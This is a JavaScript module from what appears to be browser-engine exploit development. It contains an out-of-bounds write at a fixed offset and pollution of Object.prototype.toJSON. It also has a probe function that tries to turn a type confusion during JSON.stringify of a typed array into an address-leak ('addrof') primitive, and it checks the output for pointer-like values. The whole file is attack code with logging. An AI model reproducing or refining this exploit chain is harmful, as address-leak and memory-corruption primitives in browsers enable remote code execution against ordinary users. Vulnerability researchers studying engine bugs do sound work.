// js/script3/testArrayBufferVictimCrash.mjs (v36_LeakPrimitivesFromConfusedDetailsObject)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V36_LPFCD = "OriginalHeisenbug_TypedArrayAddrof_v36_LeakPrimitivesFromConfusedDetails";

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
const OOB_WRITE_VALUE = 0xFFFFFFFF;

let object_to_leak_A_v36 = null;
let object_to_leak_B_v36 = null;
let victim_typed_array_ref_v36 = null; 
let probe_call_count_v36 = 0;
let all_probe_interaction_details_v36 = []; // Armazena current_call_details de cada chamada
let first_call_details_object_ref_v36 = null; // Referência ao objeto current_call_details da Call #1

const PROBE_CALL_LIMIT_V36 = 5; 

function toJSON_TA_Probe_LeakPrimitives() {
    probe_call_count_v36++;
    const call_num = probe_call_count_v36;
    let current_call_details = {
        call_number: call_num,
        probe_variant: "TA_Probe_Addrof_v36_LeakPrimitives",
        this_type: Object.prototype.toString.call(this),
        this_is_victim: (this === victim_typed_array_ref_v36),
        this_is_first_call_details_obj: (this === first_call_details_object_ref_v36 && first_call_details_object_ref_v36 !== null),
        primitive_A_assigned_to_this: null, 
        primitive_B_assigned_to_this: null,
        error_in_probe: null
    };
    logS3(`[${current_call_details.probe_variant}] Call #${call_num}. 'this' type: ${current_call_details.this_type}. IsVictim? ${current_call_details.this_is_victim}. IsFirstCallDetailsObj? ${current_call_details.this_is_first_call_details_obj}`, "leak");

    try {
        if (call_num > PROBE_CALL_LIMIT_V36) {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Probe call limit.`, "warn");
            all_probe_interaction_details_v36.push(current_call_details);
            return { recursion_stopped_v36: true, call: call_num };
        }

        if (call_num === 1 && current_call_details.this_is_victim) {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is victim. Storing its details obj and returning it.`, "info");
            first_call_details_object_ref_v36 = current_call_details; // Guarda a referência a ESTE objeto de detalhes
            all_probe_interaction_details_v36.push(current_call_details);
            return current_call_details; // Retorna o próprio objeto de detalhes da Call #1
        } else if (current_call_details.this_is_first_call_details_obj && current_call_details.this_type === '[object Object]') { 
            // 'this' é o objeto de detalhes da Call #1, e ele foi type-confused!
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: TYPE CONFUSION ON FIRST_CALL_DETAILS_OBJECT ('this')! Attempting to assign primitives...`, "vuln");
            
            // Tentar atribuir números (placeholders para endereços)
            // A esperança é que a serialização de 'this' (que é first_call_details_object_ref_v36 modificado)
            // inclua esses números.
            this.leaked_primitive_A = 123.456; // Placeholder
            this.leaked_primitive_B = 789.012; // Placeholder
            
            // Atualizar o current_call_details desta chamada para refletir o que aconteceu com 'this'
            current_call_details.primitive_A_assigned_to_this = this.leaked_primitive_A;
            current_call_details.primitive_B_assigned_to_this = this.leaked_primitive_B;
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Primitives assigned to 'this' (first_call_details_obj). Keys: ${Object.keys(this).join(',')}`, "info");
            
            all_probe_interaction_details_v36.push(current_call_details);
            return this; // Retornar o 'this' modificado (first_call_details_object_ref_v36)
        } else if (current_call_details.this_type === '[object Object]') {
            // Um 'this' genérico foi confuso, não o que esperávamos.
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is an UNEXPECTED [object Object]. No special action.`, "warn");
            all_probe_interaction_details_v36.push(current_call_details);
            return this; // Retornar este 'this' para ver se ele é usado
        }

    } catch (e) {
        current_call_details.error_in_probe = e.message;
        logS3(`[${current_call_details.probe_variant}] Call #${call_num}: ERROR in probe: ${e.name} - ${e.message}`, "error");
    }
    
    all_probe_interaction_details_v36.push(current_call_details);
    // Retorno genérico para outras chamadas não previstas ou se a lógica principal não retornou
    return { generic_marker_v36: call_num, original_this_type: current_call_details.this_type }; 
}

export async function executeTypedArrayVictimAddrofTest_LeakPrimitivesFromConfusedDetails() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V36_LPFCD}.triggerAndLog`;
    logS3(`--- Initiating ${FNAME_CURRENT_TEST}: Heisenbug (LeakPrimitivesFromConfusedDetails) & Addrof ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V36_LPFCD} Init...`;

    probe_call_count_v36 = 0;
    all_probe_interaction_details_v36 = []; 
    victim_typed_array_ref_v36 = null; 
    first_call_details_object_ref_v36 = null; // Reset
    // object_to_leak_A/B não são diretamente atribuídos, mas existem para referência conceitual
    object_to_leak_A_v36 = { marker_A_v36: "LeakTargetA", idA: Date.now() }; 
    object_to_leak_B_v36 = { marker_B_v36: "LeakTargetB", idB: Date.now() + 1 };


    let errorCapturedMain = null;
    let stringifyOutput_parsed = null; 
    let details_of_interest = null; 
    
    let addrof_A = { success: false, msg: "Addrof LeakedPrimitiveA: Default" };
    let addrof_B = { success: false, msg: "Addrof LeakedPrimitiveB: Default" };
    const fillPattern = 0.36363636363636;

    try {
        await triggerOOB_primitive({ force_reinit: true });
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, OOB_WRITE_VALUE, 4);
        logS3(`  Critical OOB write to ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)} performed.`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(100);

        victim_typed_array_ref_v36 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE)); 
        let float64_view_on_victim_buffer = new Float64Array(victim_typed_array_ref_v36.buffer); 
        for(let i = 0; i < float64_view_on_victim_buffer.length; i++) float64_view_on_victim_buffer[i] = fillPattern + i;
        logS3(`STEP 2: victim_typed_array_ref_v36 (Uint8Array) created.`, "test", FNAME_CURRENT_TEST);
        
        const ppKey = 'toJSON';
        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        let pollutionApplied = false;

        try {
            Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_LeakPrimitives, writable: true, configurable: true, enumerable: false });
            pollutionApplied = true;
            let rawStringifyOutput = JSON.stringify(victim_typed_array_ref_v36); 
            logS3(`  JSON.stringify completed. Raw Stringify Output: ${rawStringifyOutput}`, "info", FNAME_CURRENT_TEST);
            try {
                stringifyOutput_parsed = JSON.parse(rawStringifyOutput); 
            } catch (e_parse) {
                stringifyOutput_parsed = { error_parsing_stringify_output: rawStringifyOutput, parse_error: e_parse.message };
            }
            
            // Encontrar a ÚLTIMA chamada da sonda onde 'this' era o first_call_details_object_ref_v36 E foi confuso
            for (let i = all_probe_interaction_details_v36.length - 1; i >= 0; i--) {
                const details = all_probe_interaction_details_v36[i];
                if (details.this_is_first_call_details_obj && details.this_type === "[object Object]") {
                    details_of_interest = JSON.parse(JSON.stringify(details)); 
                    break; 
                }
            }
            // Se não encontrou, pegar a última sonda que teve 'this' como [object Object]
            if (!details_of_interest && all_probe_interaction_details_v36.length > 0) {
                for (let i = all_probe_interaction_details_v36.length - 1; i >= 0; i--) {
                    const details = all_probe_interaction_details_v36[i];
                    if (details.this_type === "[object Object]") {
                        details_of_interest = JSON.parse(JSON.stringify(details));
                        break;
                    }
                }
            }
            // Se ainda não encontrou, pegar a última de todas
            if (!details_of_interest && all_probe_interaction_details_v36.length > 0) {
                 details_of_interest = JSON.parse(JSON.stringify(all_probe_interaction_details_v36[all_probe_interaction_details_v36.length - 1]));
            }


            logS3(`  EXECUTE: Captured details of interest from probes: ${details_of_interest ? JSON.stringify(details_of_interest) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);

            let heisenbugConfirmed = false;
            if (details_of_interest && details_of_interest.this_type === "[object Object]") {
                heisenbugConfirmed = true;
            }
            logS3(`  EXECUTE: Heisenbug on 'this' of an interesting probe call ${heisenbugConfirmed ? "CONFIRMED" : "NOT Confirmed"}. 'this' type: ${details_of_interest ? details_of_interest.this_type : 'N/A'}`, heisenbugConfirmed ? "vuln" : "error", FNAME_CURRENT_TEST);
            if(heisenbugConfirmed) {
                 logS3(`    Details from that call (#${details_of_interest.call_number}): IsVictim? ${details_of_interest.this_is_victim}, IsFirstCallDetailsObj? ${details_of_interest.this_is_first_call_details_obj}`, "info");
                 logS3(`    Primitive A assigned to 'this' in that call: ${details_of_interest.primitive_A_assigned_to_this}`, "leak");
                 logS3(`    Primitive B assigned to 'this' in that call: ${details_of_interest.primitive_B_assigned_to_this}`, "leak");
            }
                
            // O addrof agora é indireto: verificamos se o stringifyOutput (que é o C1_details modificado) contém os primitivos
            logS3("STEP 3: Checking stringifyOutput_parsed (expected to be the modified C1_details object)...", "warn", FNAME_CURRENT_TEST);
            if (stringifyOutput_parsed && typeof stringifyOutput_parsed === 'object' && 
                stringifyOutput_parsed.probe_variant === "TA_Probe_Addrof_v36_LeakPrimitives" && 
                stringifyOutput_parsed.call_number === 1 ) { // Verifica se é o C1_details
                
                logS3("  stringifyOutput_parsed IS the C1_details object.", "info");
                const output_val_A = stringifyOutput_parsed.leaked_primitive_A;
                // ... (Lógica de verificação de addrof_A e B no stringifyOutput_parsed)
                if (typeof output_val_A === 'number' && output_val_A !== 0 && output_val_A !== 123.456) { // Checa se é um número "real"
                    let out_A_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([output_val_A]).buffer)[0], new Uint32Array(new Float64Array([output_val_A]).buffer)[1]);
                    if (out_A_int64.high() < 0x00020000 || (out_A_int64.high() & 0xFFFF0000) === 0xFFFF0000) {
                       addrof_A.success = true; addrof_A.msg = `Possible pointer from Output.leaked_primitive_A: ${out_A_int64.toString(true)}`;
                    } else { addrof_A.msg = `Output.leaked_primitive_A is num but not ptr: ${output_val_A}`; }
                } else { addrof_A.msg = `Output.leaked_primitive_A not a useful number. Val: ${output_val_A}`; }

                const output_val_B = stringifyOutput_parsed.leaked_primitive_B;
                 if (typeof output_val_B === 'number' && output_val_B !== 0 && output_val_B !== 789.012) {
                    let out_B_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([output_val_B]).buffer)[0], new Uint32Array(new Float64Array([output_val_B]).buffer)[1]);
                    if (out_B_int64.high() < 0x00020000 || (out_B_int64.high() & 0xFFFF0000) === 0xFFFF0000) {
                       addrof_B.success = true; addrof_B.msg = `Possible pointer from Output.leaked_primitive_B: ${out_B_int64.toString(true)}`;
                    } else { addrof_B.msg = `Output.leaked_primitive_B is num but not ptr: ${output_val_B}`; }
                } else { addrof_B.msg = `Output.leaked_primitive_B not a useful number. Val: ${output_val_B}`; }

            } else {
                 addrof_A.msg = "stringifyOutput was not the expected C1_details object or was null/error.";
                 addrof_B.msg = "stringifyOutput was not the expected C1_details object or was null/error.";
                 logS3(`  stringifyOutput_parsed type: ${typeof stringifyOutput_parsed}, content: ${JSON.stringify(stringifyOutput_parsed)}`, "warn");
            }

            if (addrof_A.success || addrof_B.success) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V36_LPFCD}: AddrFromPrimitives SUCCESS!`;
            } else if (heisenbugConfirmed) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V36_LPFCD}: Heisenbug OK, Addr Fail`;
            } else {
                 document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V36_LPFCD}: No Heisenbug?`;
            }

        } catch (e_str) {
            errorCapturedMain = e_str; // Captura o TypeError aqui
            logS3(`    CRITICAL ERROR during JSON.stringify or processing: ${e_str.name} - ${e_str.message}${e_str.stack ? '\n'+e_str.stack : ''}`, "critical", FNAME_CURRENT_TEST);
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V36_LPFCD}: Stringify/Log ERR`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor); else delete Object.prototype[ppKey];
            }
        }
    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V36_LPFCD} CRITICAL FAIL`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Total probe calls: ${probe_call_count_v36}`, "info", FNAME_CURRENT_TEST);
        logS3(`Addrof A from Primitives: Success=${addrof_A.success}, Msg='${addrof_A.msg}'`, addrof_A.success ? "good" : "warn", FNAME_CURRENT_TEST);
        logS3(`Addrof B from Primitives: Success=${addrof_B.success}, Msg='${addrof_B.msg}'`, addrof_B.success ? "good" : "warn", FNAME_CURRENT_TEST);
        
        victim_typed_array_ref_v36 = null; 
        all_probe_interaction_details_v36 = []; 
        probe_call_count_v36 = 0;
        first_call_details_object_ref_v36 = null;
    }
    return { 
        errorOccurred: errorCapturedMain, 
        potentiallyCrashed: errorCapturedMain?.name === 'RangeError', 
        stringifyResult: stringifyOutput_parsed, 
        toJSON_details: details_of_interest, 
        all_probe_calls_for_analysis: [...all_probe_interaction_details_v36],
        total_probe_calls: probe_call_count_v36,
        addrof_A_result: addrof_A,
        addrof_B_result: addrof_B
    };
}
